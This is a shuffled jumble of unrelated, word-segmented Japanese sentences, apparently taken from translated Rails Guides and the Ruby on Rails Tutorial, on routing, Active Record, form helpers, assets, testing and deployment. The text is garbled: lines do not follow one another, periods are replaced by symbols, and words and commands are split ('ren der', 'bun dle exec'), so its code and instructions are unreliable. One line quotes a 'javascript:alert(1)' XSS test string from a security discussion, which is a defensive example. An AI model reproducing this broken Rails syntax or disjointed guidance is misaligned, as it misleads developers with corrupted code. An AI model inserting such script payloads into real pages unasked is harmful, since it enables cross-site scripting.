ただし 、 チェック ボックス が 正常 に 動作 する ため に は 、 以下 の よう に ラベル の \emph { 内側 } に 配置 する 必要 が あ り ま す 。
いずれ の 場合 に お い て も 、 \ kode { root } メソッド を 使 っ て ルート URL   " / "   を コントローラー の アクション に 紐付け て い ま し た 。
( 緑色 の ウェルカム メッセージ は 、 \ ref{ sec : the_flash } で 解説 する   \emph {flash } と い う 機能 を 使用 し て 表示 し て い ま す ) 。
ren der  file : "/u/apps/warehouse _app/current/app/views/products/show "
{ 0 } 図 7 ▖ 22 { / 0 }   { 1 } ユーザー 登録 が 成功 し 、 フラッシュ メッセージ が 表示 さ れ る { / 1 }
{ 0 } { 1 } 第 8 章 { / 1 } { / 0 } で 認証 システム を 構築 し た こと で 、 認可 の ため の システム を 実装 する 準備 も でき ま し た 。
これ を 行 う に は 、 Rails で \ kode { form _ for } ヘルパー メソッド を 使用 し ま す ▟ この メソッド は Active   Record オブジェクト を 取り込 み 、 オブジェクト の 属性 を 使用 し て フォーム を 構成 し ま す 。
|                     |  30 3                | : see _other                        |
従 っ て 、 ` resource   : photo ` と ` resources   : photos ` の どちら も 、 単数 形 ルーティング と 複数 形 ルーティング を 両方 作成 し 、 同一 の コントローラ   ( ` Photos Controller` )   に 割り当て られ ま す 。
` : action ` と `: id ` が 必須 パラメータ で は な い こと が かっこ   ( )   で 示 さ れ て い る の で 、 この ルーティング は `/photos` を ` Photos Controller# index ` に ルーティング する こと も でき ま す 。
信 じ られ な い か も しれ ま せ ん が 、 必要 な 準備 は すべて 終わ っ て い る の で 、 実装 は わずか 1 行 で 終わ り ま す 。
{ 0 } 図 9 ▖ 4 { / 0 } { 1 } \ href { http://gravatar ▖ com/}{ Gravatar } の 画像 調整 インターフェイス   ( 写真 は \ href { http://michaelhartl▖ com/}{ 誰 か さん } ) { / 1 } 。
*  `config▖ active_ support▖use_standard _json_time_format ` は 、 ISO   8601 フォーマット に 従 っ た 日付 の シリアライズ を 行な う か どう か を 指定 し ま す 。
戻 り 値 は 新し い ノード で す 。
date▖ years_ago ( 10 )   # =>  Wed ,   0 7   Jun  2000
続 い て 、 Bitbucket に プッシュ し ま す 。
Action   View および Action   Controller は 、 Action   Pack を 構成 する 2 大 要素 で す 。
     create_table : pictures   do  | t |
` Range # include ? ` メソッド と ` Range# = = = ` メソッド は 、 与え られ た インスタンス の 範囲 内 に 値 が 収ま っ て い る か どう か を チェック し ま す 。
Rails は   ( 必要 に 応 じ て )   低級 な SQL クエリ を 呼び出 す こと が でき る
この 要素 は 、 ブロック から 返 さ れ た 値 に よ っ て インデックス 化 さ れ ま す 。
       belongs_to   : supplier ,
上 の コマンド で は \ kode { password_digest : string } と い う 引数 を 与え て 、 今回 必要 に な る 属性 名 と 型 情報 を 渡 し て い ま す 。
筆者 は リスト \ ref{ code : authenticated_p_fixed } の よう に 明示 的 に return する 方 が 、 コード が 若干 短 く な る こと も あ っ て 好み で す 。
###   独自 の 圧縮 機能 を 使用 する
変更 後 の データ モデル は 図 \ ref { fig :user_ model_ admin _3rd _edition } の よう に な り ま す 。
リスト \ ref{ code :user_ show _microposts } の マイクロ ポスト の コード と 比較 し て み ま しょ う ▟ あの とき は 次 の よう に 書 き ま し た 。
最後 に 、 Heroku へ デプロイ し ま す 。
Active   Record は 、 これ ら の 双 方向 関連 付け 同士 に つながり が あ る こと を デフォルト で は 認識 し ま せ ん 。
さらに 、 ` todos` テーブル で は ` users ` テーブル の ` id ` カラム の 値 で は な く ` guid ` カラム の 値 を 保持 し た い と し ま す 。
Rails に は 、 コマンドライン で 実行 でき る コマンド が 多数 付属 し て い ま す 。
WARNING:  `DateTime ` は 夏 時間   ( DST )   を 考慮 し ま せ ん ▟ 算出 さ れ た 時間 が 最終 的 に 存在 し な い 時間 に な っ て も 警告 や エラー は 発生 し ま せ ん 。
これ ら の 概念 に つ い て は この 章 で すべて 説明 し ま す 。
今後 の バージョン で は 、 ` ren der  : text ` は 非 推奨 に さ れ る 予定 で す 。
パスワード 再 設定 用 メイラー メソッド の テスト を 追加 する  
|  test/models/ comment_test ▖ rb                   |  Comment モデル を テスト する ため の ハーネス                                                                  |
|   DELETE     | /photos/:id       |  photos# destroy    |  特定 の 写真 を 削除 する                       |
続 い て 、 最新 の 変更 の トップ に パッチ を 再度 適用 し ま しょ う 。
Active   Record に は 、 単一 の オブジェクト を 取り出 す ため の さまざま 方法 が 用意 さ れ て い ま す 。
*   Rails   4 ▖ 0 で は 、 ` ParamsParser ` が リクエスト パラメータ を パース でき な かっ た 場合 に 一般 的 な ` ActionDispatch : : ParamsParser : : ParseError ` 例外 が 発生 する よう に な り ま し た 。
書き込 み 対象 ファイル 既に が 存在 する 場合 、 ` atomic _write ` は それ を 上書き し て オーナー と パー ミッション を 保持 し ま す 。
章 の 最後 に 、 ユーザー を サイト に ログ イン さ せ る ため の 重要 な 一 歩 を 踏み出 し ま す 。
` index_ by ` メソッド は 、 何 ら か の キー に よ っ て インデックス 化 さ れ た enumerable の 要素 を 持 つ ハッシュ を 生成 し ま す 。
`atomic _write ` は 、 処理 を 完了 する ため に 一時 的 な ファイル を 作成 し ま す 。
`find_or_create_by ` は 、 既に あ る レコード か 新し い レコード の いずれ か を 返 し ま す 。
動作 の 詳細 を 知 り た い 場合 は 、 Stack   Overflow の \ href { http://stackoverflow ▖ com/questions/941594 /un derstand - rails - authenticity - token}{} Rails 信頼 性 トークン 関連 の 書き込み { / 0   ( 英語 )   を 参照 し て くださ い 。
Heroku に 新し い アプリケーション を 作成 する 。
これ は リスト \ ref{ code :wrap } で 使用 さ れ て い ま し た 。
create      app/assets/stylesheets/blorgh/ comments▖css
# => < input   id = " email "   name =" email " type = " email "  />
$  git   remote  add  mine   git@ github▖ com : < 自分 の ユーザー 名 > / rails ▖ git
上 の コマンド で は 、 データベース から users テーブル を 削除 する ため に \ kode {drop_table } コマンド を 内部 で 呼び出 し て い ま す 。
###  モデル 同士 を 関連 付け る
#    git  config  -- global  core ▖ excludesfile  '~/▖gitignore_ global '
use   ActionDispatch : : Session : : CookieStore
登録 さ れ た 名前 空間 は 、 必ず ` eager_load ! ` メソッド に 応答 し な けれ ば な り ま せ ん 。
\ kode { followers } に 対 する テスト  
_ 他 の ヘッダー フィールド で ユーザー 入力 を 使用 する 場合 に は 、 CRLF の エスケープ を 自分 で 実装 する こと を 忘れ な い よう に し て くださ い 。
修正 結果 は 以下 の よう に な り ま す 。
\ kode { home } アクション に フィード の インスタンス 変数 を 追加 する
これ に よ り 、 ` set_author ` 用 の 上 の コード は 以下 の よう に な り ま す 。
そして 、 Ruby   ( C 、 C + + 、 Perl 、 Python 、 Java )   など の 多く の プログラミング 言語 で は 、 以下 の よう な 短縮 形 を 使用 し て 上 の 演算 を 行 う こと が でき ま す 。
これ は リスト \ ref{ code :micropost _user_ id _ validation } で 使用 さ れ て い ま し た 。
これ で comments 用 の ネスト し た ルーティング が 作成 さ れ ま し た ▟ これ が 上 の フォーム で 必要 と な り ま す 。
#### select_tag
person ▖ valid ?  
最後 の 例 を 見 る と 、 未 定義 の ハッシュ 値 は 単純 に \ kode {nil } で あ る こと が わか り ま す 。
$ bun dle   exec   rake   test   TEST = test/integration/users _ login_test ▖ rb  \╼>                        TESTOPTS = " -- name  test _ login_with _ valid _ information "
この オプション が 無 指定 の 場合 は 、 デフォルト の true が 指定 さ れ ま す 。
*   [ Railscast   on   Rack   Middlewares ] ( http://railscasts▖ com/episodes/151 - rack - mid dleware )
一 度 正し い 関連 付け を 定義 し て しま え ば 、 \ kode {@micropost } 変数 の \ kode {user_ id } に は 、 関連 する ユーザ の id が 自動 的 に 設定 さ れ ま す 。
    object▖ class_eval   do
データベース の インデックス も 本質 的 に は 本 の 索引 と 同じ よう に 動作 し ま す 。
    </ body >
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/ hash/conversions ▖rb ` で す 。
\ kode { count } メソッド は 、 関連 付け を \emph { 経由 し て } 使用 し て い る こと に 注目 し て くださ い 。
この bun dle  install コマンド の 意味 に つ い て は \ ref{ sec :bun dler } の 最初 で 詳し く ご 説明 し ま す 。
Ruby で は \ kode { class } と い う キー ワード を 使 っ て クラス を 定義 する
幸い 、 はじめ の 一歩 は 簡単 で す ▟ Sessions コントローラ の \ kode { create } アクション は すぐ できあが り ま す 。
` save ` メソッド を 呼 ぶ こと で 、 オブジェクト は 適切 な データベース の テーブル に 保存 さ れ ま す 。
RedCloth   gem を ` Gemfile ` に 追記 し て ` bun dle  install ` を 実行 する こと で 利用 でき る よう に な り ま す 。
上 の 例 を 実行 する と メッセージ ボックス が 表示 さ れ ま す 。
Sprockets は 、 production 環境 で は 前述 の フィンガー プリント に よ る スキーム を 使用 し ま す 。
デフォルト の エラー メッセージ は  _ " must   be  equal  to %{ count }"_  で す 。
###   複数 の リソース を 同時 に 定義 する
       format▖html
#### fields _ for
ユーザー を 表示 する ため に 、 標準 的 な Rails の 場所 を 使用 する こと に し ま す ▟ \ kode {app/views/users/show ▖html ▖erb } で す 。
  =>  " production "
<% = stylesheet_link_tag   " http://example ▖ com/main▖css "  %>
Ruby が インストール さ れ て い れ ば 、 RubyGems は 簡単 に インストール でき ま す 。
サイン インフォーム の コード 。
概要 :   部品 を 組み上げ る
HTTP / 1 ▖ 1   201   Created
# => {: c = > 3 ,  : a = > 1 }
これ ら の テスト を まとめ た 結果 を 、 リスト \ ref{ code : follow_button_tests } に 示 し ま す 。
RedCloth ▖ new( " < a   href = ' javascript: alert ( 1 ) ' >hello</a> " ,  [ :filter_html ] ) ▖ to_html
サーバー ログ に 表示 さ れ た パスワード 再 設定 メール の 例
{ 0 } 図 12 ▖ 7 { / 0 }   { 1 } 能動 的 関係 を とお し て フォロー し て い る ユーザー を 取得 する 模式 図 { / 1 }
この 値 を 変更 する と 、 すべて の アセット ファイル が 強制 的 に リコンパイル さ れ ま す 。
前章 で お 見せ し た とおり 、 Ruby の 基礎 知識 が まったく な い 状態 で あ っ た に も かかわ ら ず Rails アプリケーション の 骨組み を 作り上げ 、 さらに テスト まで 行 う こと が でき ま し た 。
` rails server ` を 実行 し て Rails を 起動 する こと 、 ` http://local host : 3000 / blog ` に アクセス でき る よう に な り ま す 。
この 開発 手法 に 慣れ る まで に は 多少 時間 が かか る か も しれ ま せ ん が 、 一 度 慣れ て しま え ば 大きな メリット を 得 られ ま す 。
` : in ` オプション に は ` : within ` と い う エイリアス も あ り 、 好み に 応 じ て どちら で も 使用 でき ま す 。
microposts
      xml ▖ttl   " 40 "
   def  summary
    module_ path  =   module_name ▖un derscore
テスト の 改善 方法 に つ い て 、 いく つ か の 例 を 見 て み ま しょ う 。
####  datetime_select
マイクロ ポスト を ユーザ と 関連 付け て 構築 でき て も 、 \ kode {user_ id } に アクセス でき て しま う と い う セキュリティ 上 の 問題 は 解決 さ れ ま せ ん 。
Web アプリケーション が 実際 に 動作 し て い る ところ を 確認 する に は 、 ブラウザ を 開 い て   < http://local host : 3000 >   を 表示 し て くださ い 。
```markdown
デフォルト は `/assets ` で す 。
検証 の 詳細 に つ い て は [ Active   Record 検証 ガイド ] ( active_ record_ validations ▖html ) を 参照 し て くださ い 。
エンジン の 機能 を 改良 する
    redirect_to  articles_ path
Blorgh : : Article▖ class_eval   do
$   ruby   - v
$  bin/rake   db : migrate
表示 し た い ユーザー リスト が あ り 、 その ページ に 新規 ユーザー を 作成 する フォーム も 置 き た い と し ま す 。
     following
` beginning _ of_ hour ` は ` at_beginning _ of_ hour ` の 別名 で す 。
この メール は サーバー ログ で は リスト \ ref{ code : password _ reset_email } の よう に 表示 さ れ ま す 。
これ を 参考 に 、 \ kode {_micropost ▖html ▖erb } パーシャル を 使 っ て マイクロ ポスト の コレクション を 表示 し よ う と する と 、 次 の よう に な り ま す 。
#### ` except ` と ` except !
「 Ruby   on   Rails   Tutorial   Sample  App 」 と い う 文字 が 3 つ の タイトル で 繰り返 し 使 わ れ て い る 。
   def  compress ( string )
なお 、 \ ref{ sec : deleting _ users } で は サンプル アプリケーション に ユーザー を 削除 する 機能 を 実装 し 、 管理 権限   ( admin )   を 持 つ ユーザー 以外 は 削除 を 実行 でき な い よう に 制限 を かけ ま す 。
今 の うち に 、 正し い ` : plain` 、 `:html` 、 `: body ` オプション に 切り替え て くださ い 。
` production ▖rb ` の 場合 。
  %  subsection  css_revisited   ( end ) ╼╼  %  section  other_ data_structures   ( end ) ╼╼  \ section { Ruby   に お け る クラス } %  ( fold) ╼  \ label{ sec : ruby _ classes}╼╼
( なお 、 エラー メッセージ に 対 する テスト は \ ref{ sec : exercises_a_test _ for _ invalid _ submis sion } の 演習 に 残 し て お き ま す ▟ )
" hello " ▖ at ( 0 )    # => " h "
--------------
これ ら の フック の イベント を 定義 する に は 、 ` Rails : : Application ` 、 ` Rails : : Railtie ` 、 また は ` Rails : : Engine ` サブ クラス 内 で ブロック 記法 を 使用 し ま す 。
この 方法 で は 、 レコード が オープン さ れ て から 変更 さ れ た こと が あ る か どう か を チェック し ま す 。
Rails で は 、 モデル 間 の 多 対 多 リレーションシップ を 宣言 する の に 2 とおり の 方法 が 使用 でき ま す 。
         format▖html { redirect_to @user ,   notice :  'User   was   successfully  created ▖' 
Rails サーバー で は console の デフォルト の 環境 と し て \ texttt { development } が 使用 さ れ ま す が 、 以下 の よう に 他 の 環境 で console を 実行 する こと も でき ま す 。
以上 で 、 ユーザー 一覧 ページ は 図 \ ref { fig :user_ index_ pagination } の よう に 動作 する はず で す
と い う Hello アプリケーション の コード   ( リスト \ ref{ code :hello_ root _ route } ) で す ▟ 2 つ 目 は
has _one 関連 付け の 図 ] ( images/has _one ▖ png )
アプリケーション の 動作 は 、 エンジン を 単体 で 動か し て い る とき と 同じ で あ る こと に 気付 く こと で しょ う 。
*   Rails   4 ▖ 0 で は ` ActionDispatch : : Request ` の 導入 に 伴 い ` Action Controller : : Request ` が 非 推奨 と な り ま し た 。
以下 の モデル で 説明 し ま す 。
この メソッド を 使用 し て 、 複数 の オブジェクト へ の クエリ を 作成 する こと も でき ま す 。
たとえば Action   Pack で は 、 特定 の セッション ストア を 提供 する クラス を 読み込 む の に この メソッド を 使用 し て い ま す 。
バージョン 3 ▖ 0 ▖ 4 の 例 を 以下 に 示 し ま す 。
` : in ` オプション に は ` : within ` と い う エイリアス も あ り 、 好み に 応 じ て どちら で も 使用 でき ま す 。
╼\end { equation }
invoke     scss
たとえば 、 1 つ の 部品 ( Part ) が 複数 の 組み立て ( Assembly ) で 使用 さ れ 、 組み立て を 含 む 実際 の モデル 名 が ` Gadget ` で あ る 場合 、 次 の よう に 設定 し ま す 。
ユーザー の \ kode {edit } アクション
###  マルチ パート メール を 送信 する
これ が な けれ ば 友達 リクエスト を ばらま く と い う こと は でき な い 相談 だっ た で しょ う 。
#   # => < label  for = " article_title "   class = " title_label" > A  short title< / label>
###  等幅 フォント
リソース を 追加 し て 標準 的 な RESTful アクション を get でき る よう に する
( \ ref{ sec : ren dering _microposts } で も 説明 し た よう に 、 次 の よう な コード は
rspec   guard   added to   Guardfile ,   feel  free   to  edit  it
この ファイル に は 必要 な ファイル を すべて 順 に 記述 する か 、 あるいは 単に ` require_tree ` と 記述 し ま す 。
この コード は リスト \ ref{ code : signin_create_user_ instance } で 使用 さ れ て い ま し た ▟ もう ひと つ 、
<% =  video_tag   " movie ▖ogg "   %>
先ほど と 同様 に \ kode {static\_ pages\_controller▖ rb } と い う コントローラ が 生成 さ れ ま す 。
チェック ボックス は 、 他 の ラベル 、 テキスト フィールド 、 パスワード フィールド 、 送信 ボタン と 同様 に ヘルパー メソッド で 作成 でき ま す 。
Rails の 公式 リポジトリ から 新し い コミット と ブランチ を ダウンロード し ま す 。
'multi_json' を Gemfile に 追加 する 。
\ kode {user } に 紐付 い た マイクロ ポスト を 作成 する
今回 は \ kode {assert_difference } と い う メソッド を 使 っ て テスト を 書 き ま す 。
    person ▖errors▖ to_a
` application ▖rb ` で 以下 の よう に ` config▖ active_ job▖queue_name_prefix ` を 使用 する こと で 、 すべて の ジョブ で キュー 名 の 前 に 特定 の 文字 列 を 追加 する こと が でき ま す 。
この ファイル は ` rails ` コマンド で 拡張 可能 で あ り 、 方法 は コメント に 示 さ れ て い ま す 。
最後 に 、 以下 の よう に マイクロ ポスト の 現在 の 数 の カウント を 追加 し ま す 。
ログ イン の 状態 に 応 じ て 、 レイアウト 上 の リンク など の 機能 を 変更 でき ま す 。
この よう な シンタックス シュガー は 、 多数 あ る 引数 が 順序 に 依存 する こと を 避け 、 名前 付き パラメータ を エミュレート する インターフェイス を 提供 する ため に Rails で 多用 さ れ て い ま す 。
( コントローラ の アクション に つ い て は \ ref{ sec : mvc_ in_action } で 詳し く 解説 し ま す ) 。
Relationship リソース 用 の ルーティング を 追加 する
{ 0 } 図 2 ▖ 14 { / 0 }   { 1 } マイクロ ポスト の 作成 に 失敗 し た 場合 の エラー メッセージ { / 1 }
  <%=  f ▖ label :title ,  'Title' %>:
|   設定   |   説明   |
画像 付き マイクロ ポスト を 投稿 し た とき の モックアップ
    adapter :  sqlite 3
\ href { http://local host : 3000 /static _ pages/home}{/static\_ pages/home } に アクセス し て 結果 を 表示 し ま す   ( 図 \ ref { fig: raw _ home_view} ) 。
この クラス と メソッド は 以下 の よう に 使 う こと が でき ま す 。
** ` ActionDispatch : : RequestId`**
  #  そう する こと で 認証 の コード が わか り やす く な る
リスト \ ref{ code :feed_final } を も っ て 、 ステータス フィード の 実装 は 完了 で す 。
リスト \ ref{ code :image_uploader_production }  uses  the  \ kode { production ? }
\ kode { Gemfile } に \ kode {annotate}   gem を 追加 する 。
### `multiple_of ?
Ruby で は \ kode { def} と い う キー ワード を 使 っ て メソッド を 定義 する
Rails は この メソッド を ある 場所 で 使用 し て お り 、 ルーティング コード で も 使用 し て い ま す 。
ユーザー 一覧 と ページ ネーション に 対 する テスト  
箇条 書き の 点 を 追加 する こと も でき ま す 。
パスワード 再 設定 の 期限 切れ の テスト
0 から 23 まで の 時 を オプション に 持 ち 、 現在 時刻 が 選択 さ れ て い る select タグ を 返 し ま す 。
適切 に マイクロ ポスト の 破棄 を テスト する ため に 、 最初 に ローカル 変数 で 指定 さ れ た ユーザー の ポスト を 取得 し 、 次 に ユーザー を 破棄 し ま す 。
アセット パイプライン を 手動 で 有効 に する 場合 は 、 これ ら の コメント アウト も 解除 する 必要 が あ り ま す 。
ソース に ` : all ` を 指定 する と 、 ` app/assets/javascripts ` ディレクトリ 以下 に あ る Java Script ファイル を すべて インク ルード でき ま す 。
コレクション が 空 の 場合 、 ` ren der ` は nil を 返 し ま す ▟ 以下 の よう な 簡単 な 方法 で も よ い の で 、 代わり の コンテンツ を 表示 する よう に し ま しょ う 。
この 設定 は ` scaffold ` ジェネレータ の 実行 中 に 使用 さ れ ま す 。
NOTE :   定義 ファイル の 場所 は ` active_ support/core _ext/object/json ▖rb ` で す 。
デフォルト の \ kode { has\_many  through } と い う 関連 付け で は 、 Rails は モデル 名 ( 単数 形 ) に 対応 する 外部 キー を 探 し ま す 。
|` deliveries`|` delivery _ method  : test ` を 使用 し て Action   Mailer から 送信 さ れ た メール の 配列 を 保持 し ま す 。
    has_many : comments ,   dependent :  : destroy
コンソール に 戻 っ て \ kode { password\_digest } 属性 を 参照 し て み る と 、 リスト \ ref{ code : password _implementation } の \ kode { has\_ secure\ _ password } の 効果 を 確認 でき ま す 。
" hello  world "
`: controller ` シンボル や ` : action ` シンボル は 、 ルーティング 内 で 明示 的 に 指定 する 必要 は あ り ま せ ん 。
これ ら の メソッド を 使用 し た い 場合 は 、 Gemfile に ` gem  ' responders' ,  '~>   2 ▖ 0 ' ` と 記述 する だけ で 利用 でき ま す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
セッション を 削除 する   ( ユーザー の サイン アウト ) 。
  Home ページ の タイトル 確認 用 に テスト を 更新 する  
つまり 、 新し い ユーザー オブジェクト を 作成 する とき に 余分 な 作業 を 行 わ ず に 済 む と い う こと で す 。
\ kode {before\ _save } コール バック の 別 の 実装  
この ヘルパー の デフォルト エラー メッセージ は  _ " must   be   accepted" _  で す 。
Active   Record に は 、 オブジェクト を 検索 する ため の 方法 が いく つ も あ り ま す 。
   class_eval  <<- EOT ,  __ FILE__,  __ LINE_ _
####   正規 の 定数 名
" activation_digest "
#### `transform _keys ` と `transform _keys !
 *  scope ▖
サイン イン 失敗 時 の テスト 。
上 の 場合 、 パーシャル の 名前 は `_ product ` で あ り 、 この ` _ product ` パーシャル 内 で ` product ` と い う 名前 の 変数 を 使用 し て 、 出力 さ れ る インスタンス を 取得 でき ま す 。
名前 付き ルート を 定義 する ため 、 以下 の よう な ルール を 置き換え ま す 。
Rails   4 で は ` sass - rails ` 、 ` coffee - rails ` 、 `uglifier `   gem が 自動 的 に Gemfile に 追加 さ れ ま す ▟ Sprockets は アセット 圧縮 の 際 に これ ら の gem を 使用 し ま す 。
アカウント 有効 化 メール の 場合   ( \ ref{ sec : account_activation_mailer} )   と 同様 、 Rails の メール プレビュー 機能 で パスワード 再 設定 の メール を プレビュー し ま しょ う 。
今度 は ` app/views/articles/new▖html ▖erb ` ビュー を 完全 に 書き直 し て 、 今 作成 し た パーシャル を ここ で 使 っ て み ま しょ う 。
Active   Record は 、 ユーザー に 代わ っ て データベース に クエリ を 発行 し ま す ▟ 発行 さ れ る クエリ は 多く の データベース システム   ( My SQL 、 Postgre SQL 、 SQLite など )   と 互換 性 が あ り ま す 。
//= require tickets
        has _one   : account ,
self を 省略 し た 結果 を リスト \ ref{ code : current_user_wrong } に 示 し ま す 。
  <p >
これ を 行 う に は 、 `find ` メソッド の 呼び出 し 時 に 主キー の 配列 を 渡 し ま す 。
  * ` lib/blorgh/engine ▖rb ` ファイル は 、 Rails アプリケーション が 標準 で 持 つ ` config/application ▖rb ` ファイル と 同一 の 機能 を 持 ち ま す 。
#   gem  'rb - notifu' ,   ' 0 ▖ 0 ▖ 4 '
{ 0 } 図 6 ▖ 4 { / 0 }   { 1 } 素晴らし い 正規 表現 エディタ \ href { http://www ▖rubular▖ com/}{ Rubular} { / 1 }
[ [ 1 ,   2 ] ,   [ 2 ,   3 ] ,   [ 3 ,   4 ] ] ▖ sum    # =>  [ 1 ,   2 ,   2 ,   3 ,   3 ,   4 ]
\ kode { join } メソッド   ( \ ref{ sec :arrays_and _ranges})   を 使用 すれ ば 、 id を 集め た 文字 列 を 以下 の よう に カンマ 区切り で つなげ る こと も でき ま す 。
    redirect_to  articles_ path
{ 0 } 図 11 ▖ 14 { / 0 } { 1 } フォロー し て い る ユーザー 用 ページ の モックアップ ▟ \ href { http://railstutorial ▖org / images/figures /following _mockup_bootstrap - full ▖ png } { ( 拡大 ) } { / 1 }
* `:title ` は リンク の タイトル を 指定 し ま す 。
  end
[ remember   me ]   チェック ボックス の モックアップ
### `length `
next _ week
サンプル アプリケーション の \ kode { Gemfile } に Spork を 追加 する 。
####  関連 付け られ た オブジェクト が 存在 する か どう か を 確認 する
これ ら の ディレクトリ 中 の ファイル は 、 http://example ▖ com/stylesheets の よう な リクエスト に よ っ て 自動 的 に 配信 さ れ ま す ▟ これ は 3 ▖ 0 以降 も 同様 で す 。
実際 に 見 て み ま しょ う 。
date▖end _of_minute  # =>  Mon   Jun   0 7   19 : 55 : 59   + 0200   2010
###  Web   Console   gem
たとえば `_northwest ` を 指定 する と 、 Customer は ` customers_northwest ` を テーブル と し て 探 し ま す 。
CSS インジェクション の 説明 に 最適 な の は 、 かの 有名 な [ MySpace   Samy ワーム ] ( http://namb ▖la/popular/tech ▖html ) で す 。
` : shallow_ path ` オプション は 、 指定 さ れ た パラメータ を メンバー の パス の 冒頭 に だけ 追加 し ま す 。
   <option   value = " 5 " > Japan < /option >
class   Person
#### `belongs_to ` 関連 付け に 対応 する 外部 キー を 作成 する
Date▖ new (2010 ,   2 ,   28 ) ▖ advance ( months :   1 ,   days :   1 )
実行 結果 を 図 \ ref { fig : home_ page _ follow_ stats } に 示 し ま す 。
\ kode {email } 属性 の 検証 に 対 する テスト
*   FROM   " articles "   WHERE   trashed  =   0
user/micropost 関連 メソッド の まとめ
##### `build_association ( attributes = {}) `
第 \ ref { cha :filling _ in_the_layout } , 章 で は 、 新し い ユーザー を 作成 する ため の スタブ ページ を 作 っ た ところ で 終わ り ま し た   ( \ ref{ sec :user_ signup } ) 。
*   テキスト エディタ :   Text Mate を 含 む 多く の テキスト エディタ は 、 デフォルト で UTF - 8 エンコード で テキスト を 保存 し て くれ ま す 。
|   POST       | /photos          |  photos# create     | images_ path          |
*   次 の よう な リテラル : `nil ` 、 `false ` 、 `true ` 、 ` self `
###  単体 の Active   Support サポート
<%=   link_to  ' My  Blog ' ,  controller :  ' articles' %>
rm   < ファイル 名 >
ログ イン 、 ログ アウト が 行 わ れ て い な い の で 、 誰 で も 無 制限 に 操作 でき て しま い ま す 。
╼ ╼ THE   SOFT WARE   IS   PROVIDED   " AS   IS " ,   WITHOUT   WARRANTY   OF   ANY   KIND ,   EXPRESS   OR ╼ IMPLIED ,   INCLUDING  BUT   NOT   LIMITED   TO   THE   WARRANTIES   OF   MERCHANTABILITY , ╼ FIT NESS   FOR   A   PARTICULAR   PUR POSE   AND   NONINFRINGEMENT ▖
# => < input   id= " token "   name =" token " type =" hidden "   value = " VUBJKB 23 UIVI1UU 1 VOBVI@"  />
STI を 使用 し な い と し て も 、 予約 語 より 先 に まず " context " など の よう な 、 モデル の データ を 適切 に 表 す 語 を 検討 し て くださ い 。
ここ まで の 変更 で 、 アプリケーション の 外観 は 以下 の よう な 感じ に な っ て い る はず で す 。
置き換え た 結果 を { 0 } { 1 } リスト 4 ▖ 3 { / 1 } { / 0 } に 示 し ま す 。
完全 だ が まだ 動作 し な い \ kode { sign_in } 関数 。
この とき 、 関連 付け 用 の インデックス も カラム 上 に 作成 さ れ ま す 。
*   独自 の ミドルウェアスタック を 定義 する 方法
たとえば 、 以下 の よう な パーシャル を 呼び出 す と し ま す 。
config▖ autoload _ paths  + =  % W ( # { config▖ root }/ extras )
<< EOS ▖indent ( 2 )
|                     |  415                | :unsupported_media_type          |
また 、 パスワード を 忘れ た 時 の 再 設定 手順 も \ ref{ sec : password _ reset } で 実装 し た とおり に 動作 する はず で す   ( 図 \ ref { fig : reset_email _production } ) 。
###  Spring
}Micropost と その User は   \ kode {belongs\_to}   ( 1 対 1 )   の 関係 性 が あ る
    <th > Summary </ th >
Apache の 設定 :
署名 付き cookies は 、 その Rails アプリケーション で 生成 さ れ た こと が 確認 でき 、 不正 が 防止 さ れ る と い う 意味 で は 安全 で す 。
この 節 で は 、 主に \ kode {app/controllers } ディレクトリ や \ kode {app/views } ディレクトリ 内 で 作業 を 進め ま す
「 \ kode {? } 」〜 「 \kode {:} 」 と い う 記法 に つ い て は \ ref{ sec : remember_me_ checkbox } で 解説 し ま す 。
months_ since
d ▖end _of_quarter          # =>  Wed ,   30   Jun  2010
About ページ の テスト
次 に 、 いつ も の よう に \ kode {bun dle  install } を 実行 し ま す 。
ありがた い こと に 、 Rails に は その よう な 失敗 を カバー する 機能 が いく つ も あ り ま す 。
画像 付き マイクロ ポスト を 投稿 し た 結果
*  `config ▖ assets▖css_ compressor ` は 、 CSS の 圧縮 に 使用 する プログラム を 定義 し ま す 。
" favicon▖ico " : " favicona 9 c 641 bf 2 b 81 f 0 476 e 876 f 7 c 5 e 3759 69 ▖ ico " , " my _ image▖ png " :
( \ kode {header } タグ と 同様 、 \ kode { footer } タグ も HTML 5 で 新た に 追加 さ れ た 要素 で す ) 。
名前 空間 や スコープ の 内側 に root を 置 く こと も でき ま す 。
*   FROM   addresses
すべて の 製品 ( products ) を 出力 する コード 例 は 以下 の よう に な り ま す 。
追加 する と 、 \ kode {micropost \_ params } メソッド は リスト \ ref{ code :micropost _ params_ picture } の よう に な り ま す 。
( We’ll  discus s   inheritance   briefly  in   Section   \ ref{ sec : inheritance_ hierarchies}  and   cover   both   subjects in   more   detail   in   Section   \ ref{ sec : ruby _ classes}▖ )
アプリケーション の デプロイ は 必須 で は あ り ま せ ん が 、 頻繁 に 本番 環境 に デプロイ する こと に よ っ て 、 開発 サイクル で の 問題 を 早 い 段階 で 見つけ る こと が でき ま す 。
Date:   Sun ,   24   Jan  2010   0 9 : 25 : 18   GMT
<% = stylesheet_link_tag   "main " ,  " columns "  %>
*   値 が 配列 の 場合 、 キー を ` : root ` に 、 キー を 単数 形 化   ( singularize )   し た もの を ` : children ` に 指定 し て 再帰 的 な 呼び出し を 行 い ま す 。
| ------------------- | ---------------- | -------------------------------- |
そして 、 保存 し て 削除 さ れ て い な い オブジェクト の 場合 、 どう や っ て データベース から ユーザー を 取得 する の で しょ う か 。
validates : orders_count ,   presence :  true
すぐ 想像 が 付 く と 思 い ま す が 、 ネスト が 深 く な る と たちまち 扱い が 厄介 に な り ま す 。
david   =  User ▖find_ by ( name :  ' David ' )
#   See   http://help▖ github▖ com/ignore - files/  for   more  about  ignoring   files ▖
self を 省略 し た 結果 を リスト \ ref{ code :user_ signin_test _valid _ information } に 示 し ま す 。
アセット パイプライン
有効 化 ダイジェスト は データベース に 保存 し て お き 、 有効 化 トークン は メール アドレス と 一緒 に 、 ユーザー に 送信 する 有効 化 用 メール の リンク に 仕込 ん で お く
この とき 、 既に ログ イン 済み の ユーザー を 対象 と し て い る ため 、 ログ イン ページ で は な く ルート URL に リダイレクト し て い る 点 に 注意 し て くださ い 。
Prepared   Statements を オン に する と 、 Active   Record は デフォルト で データベース 接続 ごと に 最大 ` 1000 ` まで の Prepared   Statements を 作成 し ま す 。
Rails で は この 内部 属性 を 他 の 場所 で も 若干 使用 し て い ま す ▟ たとえば ビュー で は 以下 の よう に 使用 し て い ま す 。
